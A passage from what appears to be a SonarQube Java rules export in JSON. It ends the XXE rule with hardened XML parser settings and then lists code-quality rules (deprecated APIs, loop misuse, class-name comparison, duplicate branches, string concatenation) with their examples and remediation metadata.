eventReader = factory.createXMLEventReader(new FileReader(\"xxe.xml\"));\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html\">TransformerFactory</a> library:</p>\n<pre>\nString xslt = \"xxe.xsl\";\nString xml = \"xxe.xml\";\nTransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();\ntransformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\ntransformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); // Compliant\n// ACCESS_EXTERNAL_SCHEMA not supported in several TransformerFactory implementations\nTransformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));\n\nStringWriter writer = new StringWriter();\ntransformer.transform(new StreamSource(xml), new StreamResult(writer));\nString result = writer.toString();\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html\">SchemaFactory</a> library:</p>\n<pre>\nString xsd = \"xxe.xsd\";\nStreamSource xsdStreamSource = new StreamSource(xsd);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nschemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); // Compliant\nschemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\nSchema schema = schemaFactory.newSchema(xsdStreamSource);\n</pre>\n<p><a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html\">Validator</a> library:</p>\n<pre>\nString xsd = \"xxe.xsd\";\nString xml = \"xxe.xml\";\nStreamSource xsdStreamSource = new StreamSource(xsd);\nStreamSource xmlStreamSource = new StreamSource(xml);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nSchema schema = schemaFactory.newSchema(xsdStreamSource);\nschemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\nschemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\n// validators will also inherit of these properties\nValidator validator = schema.newValidator();\n\nvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");   // Compliant\nvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");   // Compliant\n\nStringWriter writer = new StringWriter();\nvalidator.validate(xmlStreamSource, new StreamResult(writer));\n</pre>\n<p>For <a href=\"https://dom4j.github.io/\">dom4j</a> library, ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA are not supported, thus a very strict fix\nis to disable doctype declarations:</p>\n<pre>\nSAXReader xmlReader = new SAXReader();\nxmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); // Compliant\nDocument xmlResponse = xmlReader.read(xml);\n</pre>\n<p><a href=\"http://www.jdom.org/\">Jdom2</a> library:</p>\n<pre>\nSAXBuilder builder = new SAXBuilder(); // Compliant\nbuilder.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); // Compliant\nbuilder.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); // Compliant\nDocument document = builder.build(new File(xml));\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)\">OWASP Top 10 2017 Category A4</a> - XML External Entities\n  (XXE) </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java\">OWASP XXE Prevention Cheat\n  Sheet</a> </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/611.html\">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/827.html\">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a4"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1874",
            "repo": "java",
            "name": "\"@Deprecated\" code should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Once deprecated, classes, and interfaces, and their members should be avoided, rather than used, inherited or extended. Deprecation is a warning\nthat the class or interface has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away\nfrom the aging, soon-to-be-retired technology.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n/**\n * @deprecated  As of release 1.3, replaced by {@link #Fee}\n */\n@Deprecated\npublic class Fum { ... }\n\npublic class Foo {\n  /**\n   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}\n   */\n  @Deprecated\n  public void doTheThing() { ... }\n\n  public void doTheThingBetter() { ... }\n}\n\npublic class Bar extends Foo {\n  public void doTheThing() { ... } // Noncompliant; don't override a deprecated method or explicitly mark it as @Deprecated\n}\n\npublic class Bar extends Fum {  // Noncompliant; Fum is deprecated\n\n  public void myMethod() {\n    Foo foo = new Foo();  // okay; the class isn't deprecated\n    foo.doTheThing();  // Noncompliant; doTheThing method is deprecated\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/477.html\">MITRE, CWE-477</a> - Use of Obsolete Functions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6TdGBQ\">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>\n</ul>",
            "mdDesc": "<p>Once deprecated, classes, and interfaces, and their members should be avoided, rather than used, inherited or extended. Deprecation is a warning\nthat the class or interface has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away\nfrom the aging, soon-to-be-retired technology.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n/**\n * @deprecated  As of release 1.3, replaced by {@link #Fee}\n */\n@Deprecated\npublic class Fum { ... }\n\npublic class Foo {\n  /**\n   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}\n   */\n  @Deprecated\n  public void doTheThing() { ... }\n\n  public void doTheThingBetter() { ... }\n}\n\npublic class Bar extends Foo {\n  public void doTheThing() { ... } // Noncompliant; don't override a deprecated method or explicitly mark it as @Deprecated\n}\n\npublic class Bar extends Fum {  // Noncompliant; Fum is deprecated\n\n  public void myMethod() {\n    Foo foo = new Foo();  // okay; the class isn't deprecated\n    foo.doTheThing();  // Noncompliant; doTheThing method is deprecated\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/477.html\">MITRE, CWE-477</a> - Use of Obsolete Functions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6TdGBQ\">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "obsolete"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1994",
            "repo": "java",
            "name": "\"for\" loop increment clauses should modify the loops' counters",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It can be extremely confusing when a <code>for</code> loop's counter is incremented outside of its increment clause. In such cases, the increment\nshould be moved to the loop's increment clause if at all possible.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (i = 0; i &lt; 10; j++) { // Noncompliant\n  // ...\n  i++;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (i = 0; i &lt; 10; i++, j++) {\n  // ...\n}\n</pre>\n<p>Or </p>\n<pre>\nfor (i = 0; i &lt; 10; i++) {\n  // ...\n  j++;\n}\n</pre>",
            "mdDesc": "<p>It can be extremely confusing when a <code>for</code> loop's counter is incremented outside of its increment clause. In such cases, the increment\nshould be moved to the loop's increment clause if at all possible.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (i = 0; i &lt; 10; j++) { // Noncompliant\n  // ...\n  i++;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (i = 0; i &lt; 10; i++, j++) {\n  // ...\n}\n</pre>\n<p>Or </p>\n<pre>\nfor (i = 0; i &lt; 10; i++) {\n  // ...\n  j++;\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1751",
            "repo": "java",
            "name": "Loops with at most one iteration should be refactored",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer\nexpects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an\n<code>if</code> statement should be used instead.</p>\n<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,\n<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once\n  printf(\"i is %d\", i);\n  break;\n}\n...\nfor (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once\n  if (i == x) {\n    break;\n  } else {\n    printf(\"i is %d\", i);\n    return;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (int i = 0; i &lt; 10; i++) {\n  printf(\"i is %d\", i);\n}\n...\nfor (int i = 0; i &lt; 10; i++) {\n  if (i == x) {\n    break;\n  } else {\n    printf(\"i is %d\", i);\n  }\n}\n</pre>",
            "mdDesc": "<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer\nexpects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an\n<code>if</code> statement should be used instead.</p>\n<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,\n<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once\n  printf(\"i is %d\", i);\n  break;\n}\n...\nfor (int i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once\n  if (i == x) {\n    break;\n  } else {\n    printf(\"i is %d\", i);\n    return;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (int i = 0; i &lt; 10; i++) {\n  printf(\"i is %d\", i);\n}\n...\nfor (int i = 0; i &lt; 10; i++) {\n  if (i == x) {\n    break;\n  } else {\n    printf(\"i is %d\", i);\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1872",
            "repo": "java",
            "name": "Classes should not be compared by name",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There is no requirement that class names be unique, only that they be unique within a package. Therefore trying to determine an object's type based\non its class name is an exercise fraught with danger. One of those dangers is that a malicious user will send objects of the same name as the trusted\nclass and thereby gain trusted access.</p>\n<p>Instead, the <code>instanceof</code> operator or the <code>Class.isAssignableFrom()</code> method should be used to check the object's underlying\ntype.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npackage computer;\nclass Pear extends Laptop { ... }\n\npackage food;\nclass Pear extends Fruit { ... }\n\nclass Store {\n\n  public boolean hasSellByDate(Object item) {\n    if (\"Pear\".equals(item.getClass().getSimpleName())) {  // Noncompliant\n      return true;  // Results in throwing away week-old computers\n    }\n    return false;\n  }\n\n  public boolean isList(Class&lt;T&gt; valueClass) {\n    if (List.class.getName().equals(valueClass.getName())) {  // Noncompliant\n      return true;\n    }\n    return false;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Store {\n\n  public boolean hasSellByDate(Object item) {\n    if (item instanceof food.Pear) {\n      return true;\n    }\n    return false;\n  }\n\n  public boolean isList(Class&lt;T&gt; valueClass) {\n    if (valueClass.isAssignableFrom(List.class)) {\n      return true;\n    }\n    return false;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/486.html\">MITRE, CWE-486</a> - Comparison of Classes by Name </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/eDdGBQ\">CERT, OBJ09-J.</a> - Compare classes and not class names </li>\n</ul>",
            "mdDesc": "<p>There is no requirement that class names be unique, only that they be unique within a package. Therefore trying to determine an object's type based\non its class name is an exercise fraught with danger. One of those dangers is that a malicious user will send objects of the same name as the trusted\nclass and thereby gain trusted access.</p>\n<p>Instead, the <code>instanceof</code> operator or the <code>Class.isAssignableFrom()</code> method should be used to check the object's underlying\ntype.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npackage computer;\nclass Pear extends Laptop { ... }\n\npackage food;\nclass Pear extends Fruit { ... }\n\nclass Store {\n\n  public boolean hasSellByDate(Object item) {\n    if (\"Pear\".equals(item.getClass().getSimpleName())) {  // Noncompliant\n      return true;  // Results in throwing away week-old computers\n    }\n    return false;\n  }\n\n  public boolean isList(Class&lt;T&gt; valueClass) {\n    if (List.class.getName().equals(valueClass.getName())) {  // Noncompliant\n      return true;\n    }\n    return false;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass Store {\n\n  public boolean hasSellByDate(Object item) {\n    if (item instanceof food.Pear) {\n      return true;\n    }\n    return false;\n  }\n\n  public boolean isList(Class&lt;T&gt; valueClass) {\n    if (valueClass.isAssignableFrom(List.class)) {\n      return true;\n    }\n    return false;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/486.html\">MITRE, CWE-486</a> - Comparison of Classes by Name </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/eDdGBQ\">CERT, OBJ09-J.</a> - Compare classes and not class names </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1871",
            "repo": "java",
            "name": "Two branches in a conditional structure should not have exactly the same implementation",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at\nbest duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should\nbe combined, or for a <code>switch</code>, one should fall through to the other. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (i) {\n  case 1:\n    doFirstThing();\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  case 3:  // Noncompliant; duplicates case 1's implementation\n    doFirstThing();\n    doSomething();\n    break;\n  default:\n    doTheRest();\n}\n\nif (a &gt;= 0 &amp;&amp; a &lt; 10) {\n  doFirstThing();\n  doTheThing();\n}\nelse if (a &gt;= 10 &amp;&amp; a &lt; 20) {\n  doTheOtherThing();\n}\nelse if (a &gt;= 20 &amp;&amp; a &lt; 50) {\n  doFirstThing();\n  doTheThing();  // Noncompliant; duplicates first condition\n}\nelse {\n  doTheRest();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a\nsingle line of code with or without a following <code>break</code>.</p>\n<pre>\nif (a == 1) {\n  doSomething();  //no issue, usually this is done on purpose to increase the readability\n} else if (a == 2) {\n  doSomethingElse();\n} else {\n  doSomething();\n}\n</pre>\n<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when\nall branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default\nclauses, rule <a href='/coding_rules#rule_key=java%3AS3923'>S3923</a> raises a bug. </p>\n<pre>\nif (a == 1) {\n  doSomething();  //Noncompliant, this might have been done on purpose but probably not\n} else if (a == 2) {\n  doSomething();\n}\n</pre>",
            "mdDesc": "<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at\nbest duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should\nbe combined, or for a <code>switch</code>, one should fall through to the other. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (i) {\n  case 1:\n    doFirstThing();\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  case 3:  // Noncompliant; duplicates case 1's implementation\n    doFirstThing();\n    doSomething();\n    break;\n  default:\n    doTheRest();\n}\n\nif (a &gt;= 0 &amp;&amp; a &lt; 10) {\n  doFirstThing();\n  doTheThing();\n}\nelse if (a &gt;= 10 &amp;&amp; a &lt; 20) {\n  doTheOtherThing();\n}\nelse if (a &gt;= 20 &amp;&amp; a &lt; 50) {\n  doFirstThing();\n  doTheThing();  // Noncompliant; duplicates first condition\n}\nelse {\n  doTheRest();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a\nsingle line of code with or without a following <code>break</code>.</p>\n<pre>\nif (a == 1) {\n  doSomething();  //no issue, usually this is done on purpose to increase the readability\n} else if (a == 2) {\n  doSomethingElse();\n} else {\n  doSomething();\n}\n</pre>\n<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when\nall branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default\nclauses, rule {rule:java:S3923} raises a bug. </p>\n<pre>\nif (a == 1) {\n  doSomething();  //Noncompliant, this might have been done on purpose but probably not\n} else if (a == 2) {\n  doSomething();\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "design",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1996",
            "repo": "java",
            "name": "Files should contain only one top-level class or interface each",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain. This\nis doubly true for a file with multiple top-level classes and interfaces. It is strongly advised to divide the file into one top-level class or\ninterface per file.</p>",
            "mdDesc": "<p>A file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain. This\nis doubly true for a file with multiple top-level classes and interfaces. It is strongly advised to divide the file into one top-level class or\ninterface per file.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "LINEAR",
            "defaultDebtRemFnCoeff": "10min",
            "effortToFixDescription": "per extra type",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR",
            "debtRemFnCoeff": "10min",
            "defaultRemFnType": "LINEAR",
            "defaultRemFnGapMultiplier": "10min",
            "remFnType": "LINEAR",
            "remFnGapMultiplier": "10min",
            "remFnOverloaded": false,
            "gapDescription": "per extra type",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3937",
            "repo": "java",
            "name": "Number patterns should be regular",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus\n1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error. </p>\n<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint duos = 1_00_00;\nint million = 1_000_00_000;  // Noncompliant\nint thousand = 1000;\nint tenThousand = 100_00;  // Noncompliant\n</pre>",
            "mdDesc": "<p>The use of punctuation characters to separate subgroups in a number can make the number more readable. For instance consider 1,000,000,000 versus\n1000000000. But when the grouping is irregular, such as 1,000,00,000; it indicates an error. </p>\n<p>This rule raises an issue when underscores (<code>_</code>) are used to break a number into irregular subgroups.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint duos = 1_00_00;\nint million = 1_000_00_000;  // Noncompliant\nint thousand = 1000;\nint tenThousand = 100_00;  // Noncompliant\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1643",
            "repo": "java",
            "name": "Strings should not be concatenated using '+' in a loop",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Strings are immutable objects, so concatenation doesn't simply add the new String to the end of the existing string. Instead, in each loop\niteration, the first String is converted to an intermediate object type, the second string is appended, and then the intermediate object is converted\nback to a String. Further, performance of these intermediate operations degrades as the String gets longer. Therefore, the use of StringBuilder is\npreferred.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString str = \"\";\nfor (int i = 0; i &lt; arrayOfStrings.length ; ++i) {\n  str = str + arrayOfStrings[i];\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nStringBuilder bld = new StringBuilder();\n  for (int i = 0; i &lt; arrayOfStrings.length; ++i) {\n    bld.append(arrayOfStrings[i]);\n  }\n  String str = bld.toString();\n</pre>",
            "mdDesc": "<p>Strings are immutable objects, so concatenation doesn't simply add the new String to the end of the existing string. Instead, in each loop\niteration, the first String is converted to an intermediate object type, the second string is appended, and then the intermediate object is converted\nback to a String. Further, performance of these intermediate operations degrades as the String gets longer. Therefore, the use of StringBuilder is\npreferred.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString str = \"\";\nfor (int i = 0; i &lt; arrayOfStrings.length ; ++i) {\n  str = str + arrayOfStrings[i];\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nStringBuilder bld = new StringBuilder();\n  for (int i = 0; i &lt; arrayOfStrings.length; ++i) {\n    bld.append(arrayOfStrings[i]);\n  }\n  String str = bld.toString();\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1764",
            "repo": "java",
            "name": "Identical expressions should not be used on both sides of a binary operator",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste\nerror and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical\noperators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( a == a ) { // always true\n  doZ();\n}\nif ( a != a ) { // always false\n  doY();\n}\nif ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too\n  doX();\n}\nif ( a == b || a == b ) { // if the first one is true, the second one is too\n  doW();\n}\n\nint j = 5 / 5; //always 1\nint k = 5 - 5; //always 0\n\nc.equals(c); //always true\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </li>\n  <li> The specific case of testing a floating point value against itself is a valid test for <code>NaN</code> and is therefore ignored. </li>\n  <li> Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </li>\n</ul>\n<pre>\nfloat f;\nif(f != f) { //test for NaN value\n  System.out.println(\"f is NaN\");\n}\n\nint i = 1 &lt;&lt; 1; // Compliant\nint j = a &lt;&lt; a; // Noncompliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n  <li> <a href='/coding_rules#rule_key=java%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>\n</ul>",
            "mdDesc": "<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste\nerror and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical\noperators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ( a == a ) { // always true\n  doZ();\n}\nif ( a != a ) { // always false\n  doY();\n}\nif ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too\n  doX();\n}\nif ( a == b || a == b ) { // if the first one is true, the second one is too\n  doW();\n}\n\nint j = 5 / 5; //always 1\nint k = 5 - 5; //always 0\n\nc.equals(c); //always true\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </li>\n  <li> The specific case of testing a floating point value against itself is a valid test for <code>NaN</code> and is therefore ignored. </li>\n  <li> Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </li>\n</ul>\n<pre>\nfloat f;\nif(f != f) { //test for NaN value\n  System.out.println(\"f is NaN\");\n}\n\nint i = 1 &lt;&lt; 1; // Compliant\nint j = a &lt;&lt; a; // Noncompliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n  <li> {rule:java:S1656} - Implements a check on <code>=</code>. </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
